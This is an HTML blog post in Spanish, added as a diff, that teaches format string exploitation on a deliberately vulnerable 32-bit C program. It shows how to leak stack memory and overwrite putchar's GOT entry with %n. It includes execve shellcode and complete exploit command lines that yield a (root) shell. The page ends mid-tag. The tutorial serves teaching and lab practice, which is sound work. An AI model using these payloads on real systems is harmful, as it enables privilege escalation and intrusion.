@@ -1,0 +1,196 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Format String Atack - Security Signal</title>
+  <meta name="author" content="q3rv0 - hdbreaker">
+
+  
+  <meta name="description" content="by hdbreakerEsta entrada esta dedicada a la lista de entradas sobre Exploiting, pero de momento dejaremos de lado los tratados Buffer Overflow para &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://securitysignal.github.io/blog/2016/03/08/format-string-atack/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Security Signal" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Security Signal</a></h1>
+  
+    <h2>Looking for signs of insecurity...</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="securitysignal.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Format String Atack</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2016-03-08T17:58:00-08:00'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>8</span><span class='date-suffix'>th</span>, <span class='date-year'>2016</span></span> <span class='time'>5:58 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="https://2.bp.blogspot.com/-0eWf79c9C98/VtnROONBjAI/AAAAAAAAA48/SAbGK4oggMU/s1600/s.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="400" src="https://2.bp.blogspot.com/-0eWf79c9C98/VtnROONBjAI/AAAAAAAAA48/SAbGK4oggMU/s400/s.jpg" width="400" /></a></div><div style="text-align: right;"><b>by hdbreaker</b></div><br />Esta entrada esta dedicada a la lista de entradas sobre <b>Exploiting</b>, pero de momento dejaremos de <br />lado los tratados <b>Buffer Overflow</b> para hablar sobre <br /><a name='more'></a><b></b><br /><h2 style="text-align: center;"><b><b>Format String Atack</b><b>&nbsp;</b></b></h2><b></b><br />Veremos como en el mejor de los casos un <b>Format String Atack </b>puede derivar en &nbsp;la ejecución de código arbitrario.<br /><br />Antes de comenzar, a que nos referimos con&nbsp;<b>Format String</b>?<br /><br />En C/C++ exiten una serie de funciones que nos permiten imprimir en pantalla texto formateado especificado según una serie de <b>parámetros de formato</b><br /><b><br /></b>Estas son las funciones especificadas por <b>owasp</b>:<br /><br /><table align="center" border="1" cellpadding="20" cellspacing="0"><tbody><tr><th>Format function </th><th>Description </th></tr><tr><td>fprint </td><td>Writes the printf to a file </td></tr><tr><td>printf </td><td>Output a formatted string </td></tr><tr><td>sprintf </td><td>Prints into a string </td></tr><tr><td>snprintf </td><td>Prints into a string checking the length </td></tr><tr><td>vfprintf </td><td>Prints the a va_arg structure to a file </td></tr><tr><td>vprintf </td><td>Prints the va_arg structure to stdout </td></tr><tr><td>vsprintf </td><td>Prints the va_arg to a string </td></tr><tr><td>vsnprintf </td><td>Prints the va_arg to a string checking the length </td></tr></tbody></table><br />Estas funciones pueden utilizar la siguiente lista de <b>parámetros de formato:</b><br /><br /><table align="center" border="1" cellpadding="20" cellspacing="0"><tbody><tr><th>Parameters </th><th>Output </th><th>Passed as </th></tr><tr><td>%% </td><td>% character (literal) </td><td>Reference </td></tr><tr><td>%p </td><td>External representation of a pointer to void </td><td>Reference </td></tr><tr><td>%d </td><td>Decimal </td><td>Value </td></tr><tr><td>%c </td><td>Character </td><td></td></tr><tr><td>%u </td><td>Unsigned decimal </td><td>Value </td></tr><tr><td>%x </td><td>Hexadecimal </td><td>Value </td></tr><tr><td>%s </td><td>String </td><td>Reference </td></tr><tr><td>%n </td><td>Writes the number of characters into a pointer </td><td>Reference </td></tr></tbody></table><br />Un ejemplo del uso correcto de estas funciones es:<br /><br />C Code:<br /><br /><pre class="brush: c">printf("Color %s, numero %d, hex %x\n", "rojo", 12345, 255);<br /><br /></pre><br />Output:<br /><br /><div class="separator" style="clear: both; text-align: left;"><a href="https://3.bp.blogspot.com/-1R4EsgOoT_A/VtnXZ3gDxLI/AAAAAAAAA5M/jFVVrWf7zqg/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B15%253A43%253A25.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="50" src="https://3.bp.blogspot.com/-1R4EsgOoT_A/VtnXZ3gDxLI/AAAAAAAAA5M/jFVVrWf7zqg/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B15%253A43%253A25.png" width="640" /></a></div><br /><br />Como vemos la función muestra los valores <b>"rojo", 12345, 255 </b>respetando el formato correspondiente a la orden de aparición de los parámetros de formato.<br /><br />De esta forma <b>%s</b> imprime el string <b>"rojo"</b>, <b>%d</b> imprime el valor decimal de <b>12345</b>, y <b>%x</b> imprime el valor hexadecimal de <b>255</b><br /><div><br /></div><h2 style="text-align: center;"><b>La vulnerabilidad</b></h2><div>De aquí en adelante usaremos el siguiente código vulnerable:<br /><br />Código C:</div><div><br /></div><pre class="brush: c">//vuln.c<br />#include  &lt;stdio.h&gt;<br />#include  &lt;string.h&gt;<br />#include  &lt;stdlib.h&gt;<br /><br />int main (int argc, char **argv)<br />{<br />        char b[100];<br />        strcpy(b, argv[1]);<br />        printf (b);<br />        printf ("\n");<br />        return 0 ;<br />}<br /></pre><div><br /></div><div>Desactivamos el ASLR:</div><div><b>#&nbsp;echo 0 &gt; /proc/sys/kernel/randomize_va_space</b></div><div><b><br /></b></div><div>Compilamos eliminando protecciones:</div><div><b>$ gcc -m32 -fno-stack-protector -z execstack vuln.c -o vuln</b></div><div><br /></div><div>Si analizamos el código vemos que existe un <b>Buffer Overflow </b>en la funcion <b>strcpy(b, argv[1]); </b>donde se copia todo lo ingresado como parámetro de consola (&nbsp;<b>argv[1]&nbsp;</b>) en el buffer &nbsp;<b>b</b> con tamaño determinado en <b>char b[100];</b></div><div><b><br /></b></div><div>Sin embargo no explotaremos el <b>Buffer Overflow,</b>&nbsp;sino que nos centraremos en la función <b>printf (b);</b></div><div><b><br /></b></div><div>En la misma radica la vulnerabilidad de <b>Format String Atack.</b></div><div><br /></div><div>La misma se produce cuando se utiliza alguna función de formato que imprime <b>datos ingresados por el usuario (<span style="color: red;">argv[1]</span>)</b> sin especificar parámetros de formateo.</div><div><br /></div><div>Por lo cual, un atacante podría ingresar como datos parámetros de formateo modificando el funcionamiento de la función <b>printf() </b>a gusto.<b>&nbsp;</b>&nbsp;</div><div><br /></div>En la practica existen 3 parámetros que nos permitirán explotar un Format String Atack:<br /><br /><div style="background-color: white; color: #252525; font-family: sans-serif; font-size: 14px; line-height: 22.3999996185303px; margin-bottom: 0.5em; margin-top: 0.5em;">•"%x" Nos permitirá leer registros del stack</div><div style="background-color: white; color: #252525; font-family: sans-serif; font-size: 14px; line-height: 22.3999996185303px; margin-bottom: 0.5em; margin-top: 0.5em;">•"%s" Nos permitirá leer strings desde la memoria del proceso</div><div style="background-color: white; color: #252525; font-family: sans-serif; font-size: 14px; line-height: 22.3999996185303px; margin-bottom: 0.5em; margin-top: 0.5em;">•"%n" Nos permitirá escribir enteros a un puntero especifico de memoria</div><h2 style="text-align: center;">Information Leakage</h2>El ataque comienza con la posibilidad de recuperar información del Stack y de la Memoria del Proceso utilizando los operadores de lectura %x y %s<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://4.bp.blogspot.com/-m1gItg5r-Uc/VtnfkMEhhLI/AAAAAAAAA5c/svJg_sMmaxM/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B16%253A18%253A16.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="40" src="https://4.bp.blogspot.com/-m1gItg5r-Uc/VtnfkMEhhLI/AAAAAAAAA5c/svJg_sMmaxM/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B16%253A18%253A16.png" width="640" /></a></div><br />Como vemos el programa funciona correctamente e imprime los datos que le enviamos, pero al ser vulnerable, podemos inyectar parámetros de formateo y ver como responde el programa:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://3.bp.blogspot.com/-nNUHDIWzFSg/VtnggHW4qkI/AAAAAAAAA5k/Hx4zFZI6yZ0/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B16%253A22%253A09.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="42" src="https://3.bp.blogspot.com/-nNUHDIWzFSg/VtnggHW4qkI/AAAAAAAAA5k/Hx4zFZI6yZ0/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B16%253A22%253A09.png" width="640" /></a></div><br />Como vemos los parámetros de formateo se inyectaron correctamente y comenzamos a retornar contenido del stack en las posiciones siguientes del stack, para verlo mas claro, lo analizaremos desde gdb:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://4.bp.blogspot.com/-iCSyqeMmyLI/VtnhWkfPTnI/AAAAAAAAA5w/lwlJME-OWfI/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B16%253A25%253A39.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="424" src="https://4.bp.blogspot.com/-iCSyqeMmyLI/VtnhWkfPTnI/AAAAAAAAA5w/lwlJME-OWfI/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B16%253A25%253A39.png" width="640" /></a></div><br />Si vemos la sección Stack se puede ver que la posición&nbsp;<b>02:0008,&nbsp;02:0012,&nbsp;02:0016 </b>contienen los valores: <b>0xffffd1b1 , 0x2c0003f y 0x0</b><br /><br />que son exactamente los mismos que nos devuelve nuestra inyección: <br /><div><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="https://3.bp.blogspot.com/-WeoVdhGIzj4/VtniOJ9CCqI/AAAAAAAAA54/YeGsJfqK0a4/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B16%253A29%253A29.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="56" src="https://3.bp.blogspot.com/-WeoVdhGIzj4/VtniOJ9CCqI/AAAAAAAAA54/YeGsJfqK0a4/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B16%253A29%253A29.png" width="640" /></a></div><div><br /></div><div></div>Esto significa que el parámetro %x devuelve el contenido de las direcciones de memoria posteriores al llamado de la función <b>printf(b)</b> y de esta forma podemos acceder al contenido del Stack.<br /><br />También podemos acceder a un lugar especifico del Stack determinando cuantas posiciones hacia adelante queremos leer, por ejemplo, si quisiéramos retornar el valor&nbsp;<b>0x2c0003f</b>, deberíamos mover 2 posiciones el puntero de lectura, esto se puede hacer de la siguiente forma: <b>%2\$x</b><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-DBbKjhDsNG8/VtnjgQlshZI/AAAAAAAAA6E/ggwfXtQNyYA/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B16%253A35%253A09.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="54" src="https://1.bp.blogspot.com/-DBbKjhDsNG8/VtnjgQlshZI/AAAAAAAAA6E/ggwfXtQNyYA/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B16%253A35%253A09.png" width="640" /></a></div><br /><b>%2</b> =&gt; indica la cantidad de saltos que vamos a realizar con el puntero de lectura<br /><b>\$x</b> =&gt; indica el parámetro de formateo.<br /><br />Otro ejemplo, leeremos un string de las variables de entorno en la memoria del proceso:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://4.bp.blogspot.com/-3iVIbi_vJd4/VtnkEAjklKI/AAAAAAAAA6I/mWPX2zqi_VA/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B16%253A37%253A36.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="54" src="https://4.bp.blogspot.com/-3iVIbi_vJd4/VtnkEAjklKI/AAAAAAAAA6I/mWPX2zqi_VA/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B16%253A37%253A36.png" width="640" /></a></div><br />Se observa que moviendo el puntero lo suficiente (%121) e indicando que vamos a leer un string (\$s)<br />podemos obtener información de la memoria del proceso, en este caso información sobre las variables de entorno que se cargan en momento de ejecución:<br /><br /><b>KONSOLE_DBUS_SESSION=/Sessions/2</b><br /><br /><h2 style="text-align: center;">Explotation</h2>Comprendiendo el funcionamiento de un binario, podemos determinar que el valor ingresado por el usuario (<b>AAAA</b>) debe, en algún momento ser cargado en una variable del Stack para luego ser utilizado por diferentes instrucciones del ensamblador.<br /><br />Para explotar un <b>Arbitrary Code Execution</b>&nbsp;debemos determinar la posición del Stack donde se guarda nuestro parametro de entrada.<br /><br />Esto lo lograremos leyendo continuamente posiciones del Stack con el parametro de formato <b>%x.</b><br /><b><br /></b><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://3.bp.blogspot.com/-mQ3LQgpDw8M/VtnmEKY52yI/AAAAAAAAA6Y/Wt5E7VrWtUo/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B16%253A45%253A58.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="52" src="https://3.bp.blogspot.com/-mQ3LQgpDw8M/VtnmEKY52yI/AAAAAAAAA6Y/Wt5E7VrWtUo/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B16%253A45%253A58.png" width="640" /></a></div><b><br /></b>Podemos ver que en la posición 7 del Stack se encuentra guardado el valor <b>41414141 </b>que corresponde a AAAA en <b>hexadecimal</b>.<br /><b><br /></b>La magia sucede cuando utilizamos el parametro de formateo <b>%n </b>que nos permitirá escribir un entero dentro de una posición de memoria determinada. Este entero estará dado por el largo de caracteres que contenga nuestro valor ingresado por el usuario.<br /><br />Realizamos una prueba y vemos que se produce un Segmentation Fault:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://2.bp.blogspot.com/-KRQZbHonZtU/VtnoGO3CX1I/AAAAAAAAA6k/U9y_g6BXt4E/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B16%253A54%253A39.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="48" src="https://2.bp.blogspot.com/-KRQZbHonZtU/VtnoGO3CX1I/AAAAAAAAA6k/U9y_g6BXt4E/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B16%253A54%253A39.png" width="640" /></a></div><br />para entender por que se produce esto, debuggearemos con gdb:<br /><br /><b>gdb-peda$ r AAAA-%7\$n</b><br /><div><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="https://3.bp.blogspot.com/-K6YOHLCnzvk/VtnodwqrJpI/AAAAAAAAA6o/SlIwsYoC-ms/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B16%253A56%253A12.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="106" src="https://3.bp.blogspot.com/-K6YOHLCnzvk/VtnodwqrJpI/AAAAAAAAA6o/SlIwsYoC-ms/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B16%253A56%253A12.png" width="640" /></a></div><br />Vemos que nuestro puntero se detiene en:<br /><b>mov &nbsp; &nbsp;DWORD PTR [eax],ecx</b><br /><b><br /></b>Lo que implica que el error que produce nuestro segmentation fault se produce aquí.<br /><br />La instrucción MOV intenta mover el contenido de <b>ECX</b> dentro de la dirección de memoria de&nbsp;<b>EAX</b>,<br />pero que contiene ECX y EAX?<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-iYWLQs2RFsU/VtnpTN1hG0I/AAAAAAAAA6w/Fw78ZIjocGw/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B17%253A00%253A01.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="76" src="https://1.bp.blogspot.com/-iYWLQs2RFsU/VtnpTN1hG0I/AAAAAAAAA6w/Fw78ZIjocGw/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B17%253A00%253A01.png" width="640" /></a></div><br /><b>ECX</b> =&gt; Corresponde al largo del parámetro que enviamos por consola, nosotros enviamos AAAA-<br />lo cual corresponde a 5 caracteres, cuya representación hexadecimal es 0x5.<br /><br /><b>EAX</b> =&gt; Es la dirección de memoria donde se va a guardar ECX, obviamente la dirección de memoria <b>0x41414141</b> no existe, por lo que al intentar copiar ECX dentro de EAX el programa se detiene.<br /><br /><b>Esto nos da información muy importante:</b><br /><br /><span style="color: red;">Por medio de información enviada por el usuario podemos escribir un entero de cualquier largo dentro de una dirección de memoria que inyectamos arbitrariamente en el Stack. </span><br /><br />Esto nos permitirá controlar el flujo de la aplicación reescribiendo la dirección de memoria donde debe saltar una llamada a libc, o dicho de otra forma, hacia donde debe saltar una instrucción Call que llame a una funcion de libc.<br /><br />Desensamblamos MAIN y buscamos una llamada a una funcion de libc posterior a printf:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://3.bp.blogspot.com/-ABrGB2wu4B4/VtnrVdXo-OI/AAAAAAAAA7A/zLadoUGSGTo/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B17%253A08%253A40.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="438" src="https://3.bp.blogspot.com/-ABrGB2wu4B4/VtnrVdXo-OI/AAAAAAAAA7A/zLadoUGSGTo/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B17%253A08%253A40.png" width="640" /></a></div><br />Vemos que en la dirección&nbsp;<b>0x080484a5 </b>se produce la llamada a <b>printf</b>, y posterior mente en la dirección&nbsp;<b>0x080484b1 </b>se realiza una llamada a la función <b>putchar</b>.<br /><br />Ambas funciones pertenecen a <b>libc</b>, y todas los punteros hacia funciones importadas desde <b>libc</b> se cargan en la tabla:&nbsp;<b>DYNAMIC RELOCATION RECORDS</b><br /><b><br /></b>Obtenemos esta tabla utilizando <b>Objdump:&nbsp;</b><br /><b>$ objdump -R vuln</b><br /><b><br /></b><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://2.bp.blogspot.com/-vQ8z_uZFNQA/VtnscxE6q6I/AAAAAAAAA7I/1PVuwMSEp68/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B17%253A13%253A06.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="244" src="https://2.bp.blogspot.com/-vQ8z_uZFNQA/VtnscxE6q6I/AAAAAAAAA7I/1PVuwMSEp68/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B17%253A13%253A06.png" width="640" /></a></div><b><br /></b><br />En síntesis, al ejecutarse la instrucción CALL hacia <b>putchar</b>, la memoria retorna la dirección correcta hacia donde debe saltar<b>&nbsp;</b>preguntandole a la tabla&nbsp;<b>DYNAMIC RELOCATION RECORDS en que dirección de memoria de libc </b>se encuentra <b>putchar.</b><br />En este caso <b>putchar </b>se encuentra en la dirección de memoria <b>0x0804a01c</b>.<br /><br />Gracias al <b>Format String Atack </b>podremos modificar esta dirección y lograr que&nbsp;<b>DYNAMIC RELOCATION RECORDS </b>le responda a&nbsp;<b>CALL </b>con&nbsp;la dirección de memoria donde alojemos nuestro Shellcode.<br /><br />Para esto crearemos nuestra shellcode dentro de una variable de entorno:<br /><br /><pre class="brush: bash">$ export EGG=$(python -c "print '\x90'*100+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")<br /></pre><br /><br />y obtendremos su dirección por medio de <b>Getenv </b>o por medio de <b>gdb:</b><br /><b><br /></b><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://4.bp.blogspot.com/-kkFXEgkuTgI/VtnuO4njehI/AAAAAAAAA7U/fZYyU08mvH8/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B17%253A20%253A59.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="42" src="https://4.bp.blogspot.com/-kkFXEgkuTgI/VtnuO4njehI/AAAAAAAAA7U/fZYyU08mvH8/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B17%253A20%253A59.png" width="640" /></a></div><b><br /></b>Nuestro shellcode se aloja en la dirección de memoria:&nbsp;<b>0xffffd3c8</b><br /><b><br /></b>Por lo cual debemos lograr que&nbsp;<b>DYNAMIC RELOCATION RECORDS </b>responda al <b>Call </b>esa dirección.<br /><br />Para esto utilizaremos el parametro de formateo <b>%n</b> para sobrescribir con enteros la dirección <b>0x0804a01c</b> (<b>DYNAMIC RELOCATION RECORDS de putchar</b>), por la que nosotros deseemos.<br /><br />Como la mayoria de los enteros se pueden representar por el largo de 2 bytes, deberemos dividir la dirección&nbsp;<b>0x0804a01c </b>en 2 direcciones:<br /><br /><b><span style="color: red;">!!!Recordar Little Endian!!!</span></b><br />La primera:&nbsp;<b>0x0804a01c </b>que contemplara los 2 primeros bytes del string:&nbsp;<b>a01c</b><br />La segunda:&nbsp;<b>0x0804a01e </b>que contemplara los 2 ultimos bytes del string&nbsp;<b>0804</b><br /><br />Por lo que nuestro payload quedara de la siguiente forma:<br /><br /><pre class="brush: bash">r $(python -c "import struct; print struct.pack('&lt;I', 0x0804a01c) + struct.pack('&lt;I', 0x0804a01e)")-%7\$n-%8\$n<br /></pre><br /><br /><div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"><a href="https://3.bp.blogspot.com/-H5U-PsgQUKA/VtnyohLjNUI/AAAAAAAAA7s/--u24gAN56k/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B17%253A38%253A28.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="24" src="https://3.bp.blogspot.com/-H5U-PsgQUKA/VtnyohLjNUI/AAAAAAAAA7s/--u24gAN56k/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B17%253A38%253A28.png" width="640" /></a></div><br />Observamos como EIP ahora salta hacia: <b>0x000a0009</b><br /><br />De ahora en mas todo lo que se encuentre delante de <b>%7\$n </b>modificara la dirección <b>0x0804a01c </b>que corresponde al segmento:&nbsp;<b>0009 </b>y todo lo que se encuentre delante de <b>%8\$n </b>modificara la dirección <b>0x0804a01e </b>que corresponde al segmento:&nbsp;<b>000a</b><br /><b><br /></b><b>Recordemos:</b><br />Nuestro shellcode se aloja en la dirección de memoria:&nbsp;<b>0xffffd3c8</b><br /><b><br /></b>Jugando con el largo del input deberiamos lograr que <b>0009 </b>se convierta en&nbsp;<b>d3c8 </b>y <b>000a </b>se convierta en <b>ffff</b>.<br /><br />Ingresar todos estos caracteres uno a uno hasta llegar al objetivo es algo un tanto engorroso podremos ayudarnos del operador de formato: <b>%<span style="color: red;">{Numer_Decimal}</span>u</b> que incrementara el valor ingresado tal cual si lo hicieramos a mano.<br /><br />Hora de calcular:<br /><br /><b>d3c8 - 0009 =&nbsp;D3BF =&gt;&nbsp;54207 Decimal</b><br /><br />Modificamos nuestro payload:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://2.bp.blogspot.com/-SecjxXbMFC0/Vtn0zZvFuaI/AAAAAAAAA74/v9VXIWKphZM/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B17%253A49%253A05.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="22" src="https://2.bp.blogspot.com/-SecjxXbMFC0/Vtn0zZvFuaI/AAAAAAAAA74/v9VXIWKphZM/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B17%253A49%253A05.png" width="640" /></a></div><br />Vemos como nuestro <b>0009 </b>ahora es&nbsp;<b>d3c8 </b>que es la cola de nuestra dirección de shellcode:&nbsp;<b>0xffffd3c8</b><br />pero tambien vemos que <b>000a </b>se transformo a&nbsp;<b>d3c9</b>&nbsp;esto se debe al aumento de bytes producto de insertar el largo de&nbsp;<b>54207 </b>caracteres.<br /><br />Calculamos la diferencia faltante para la cabeza de nuestra dirección de memoria:<br /><br /><b>ffff - d3c9 =&nbsp;2C36&nbsp;=&gt;&nbsp;11318&nbsp;Decimal</b><br /><b><br /></b>Corregimos nuestro payload:<br /><br /><pre class="brush: bash">r $(python -c "import struct; print struct.pack('&lt;I', 0x0804a01c) + struct.pack('&lt;I', 0x0804a01e)")-%54207u%7\$n-%11318u%8\$n<br /></pre><br /><br />y obtenemos shell dentro de gdb:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://3.bp.blogspot.com/-hrUynbi_TeI/Vtn1989lJSI/AAAAAAAAA8A/x9MDGIUu9_0/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B17%253A54%253A02.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="80" src="https://3.bp.blogspot.com/-hrUynbi_TeI/Vtn1989lJSI/AAAAAAAAA8A/x9MDGIUu9_0/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B17%253A54%253A02.png" width="640" /></a></div><br />Solo queda lograr la ejecución fuera de gdb:<br /><br /><pre class="brush: bash">./vuln $(python -c "import struct; print struct.pack('&lt;I', 0x0804a01c) + struct.pack('&lt;I', 0x0804a01e)")-%54207u%7\$n-%11318u%8\$n</pre><pre class="brush: bash"></pre><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-fzFRPOqsECc/Vt-BZv1cFvI/AAAAAAAAA8U/BVwkdx9TmsA/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-08%2B22%253A48%253A31.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="32" src="https://1.bp.blogspot.com/-fzFRPOqsECc/Vt-BZv1cFvI/AAAAAAAAA8U/BVwkdx9TmsA/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-08%2B22%253A48%253A31.png" width="640" /></a></div><br />Como verán la dirección cambió un poco, nuestro shellcode comienza en la dirección <b>0xfffd3c2</b><br />sin embargo nuestro exploit funcionara igual aunque estemos redirigiendo el flujo a la dirección&nbsp;<b>0xfffd3c8, </b>ya que esta zona esta contenida por nuestro nopsleed (es decir los primeros 100 <b>nop </b>agregados al inicio de nuestra shellcode: <b>export EGG=$(python -c "print '\x90'*100...</b>)<br /><br />El resultado:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://4.bp.blogspot.com/-h27ZbNuieYE/Vt-BrZrSIWI/AAAAAAAAA8Y/qInlf0Fn5yA/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-08%2B22%253A48%253A49.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="144" src="https://4.bp.blogspot.com/-h27ZbNuieYE/Vt-BrZrSIWI/AAAAAAAAA8Y/qInlf0Fn5yA/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-08%2B22%253A48%253A49.png" width="640" /></a></div><br />Si el dueño del binario fuese, y tuviera el Bit Suid activo obtendríamos Shell Root:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://3.bp.blogspot.com/-bdY85VzxXUE/Vt-CqdaANII/AAAAAAAAA8k/TcRRbf-gWPI/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-08%2B22%253A55%253A15.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="80" src="https://3.bp.blogspot.com/-bdY85VzxXUE/Vt-CqdaANII/AAAAAAAAA8k/TcRRbf-gWPI/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-08%2B22%253A55%253A15.png" width="640" /></a></div><br />Root:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-_jJwA0xwqiU/Vt-C1byzFCI/AAAAAAAAA8o/Os6qzvfLkBw/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-08%2B22%253A56%253A27.png" imageanchor="1" 